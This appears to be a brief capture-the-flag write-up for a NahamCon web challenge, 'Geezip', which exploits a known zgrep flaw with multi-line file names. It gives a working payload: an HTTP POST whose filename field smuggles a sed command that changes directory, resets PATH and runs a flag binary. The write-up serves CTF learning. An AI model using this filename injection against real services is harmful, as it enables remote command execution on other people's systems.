# Geezip

This is a web application that allows us to `gzip` content and provides a summary using `zgrep`. I found a recent [vulnerability](https://seclists.org/oss-sec/2022/q2/23) in `zgrep` that leads to RCE when using multi-line file names.

However, slashes (`/`) won't work in the filename, so we need to do something like the following to run the `get_flag` binary in the root directory:

```bash
cd .. && export PATH=. && get_flag
```

Placing the above payload into our filename:

```http
POST / HTTP/1.1
Host: challenge.nahamcon.com:31694
Content-Length: 91

...

Connection: close

action=submit&filename=|
;e cd+..+%26%26+export+PATH%3d.+%26%26+get_flag
#.gz&contents=test
```
